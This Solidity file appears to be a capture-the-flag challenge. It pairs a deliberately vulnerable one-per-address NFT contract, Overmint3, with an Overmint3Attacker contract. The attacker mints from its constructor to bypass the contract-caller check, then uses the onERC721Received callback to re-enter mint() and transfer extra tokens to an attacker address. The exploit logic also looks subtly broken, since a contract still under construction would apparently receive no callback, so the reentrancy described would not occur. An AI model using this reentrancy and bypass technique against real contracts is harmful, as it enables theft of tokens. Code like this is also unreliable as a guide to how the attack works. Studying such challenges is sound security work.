// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint3 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!msg.sender.isContract(), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }
}

contract Overmint3Attacker is IERC721Receiver {
    Overmint3 private victim;

    constructor (Overmint3 victim_, address attacker) {
        victim = victim_;

        victim.mint();

        victim.transferFrom(address(this), attacker, 1);
        victim.transferFrom(address(this), attacker, 2);
        // victim.transferFrom(address(this), attacker, 3);
        // victim.transferFrom(address(this), attacker, 4);
        // victim.transferFrom(address(this), attacker, 5);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns (bytes4) {
        if (victim.balanceOf(address(this)) < 5) {
            victim.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
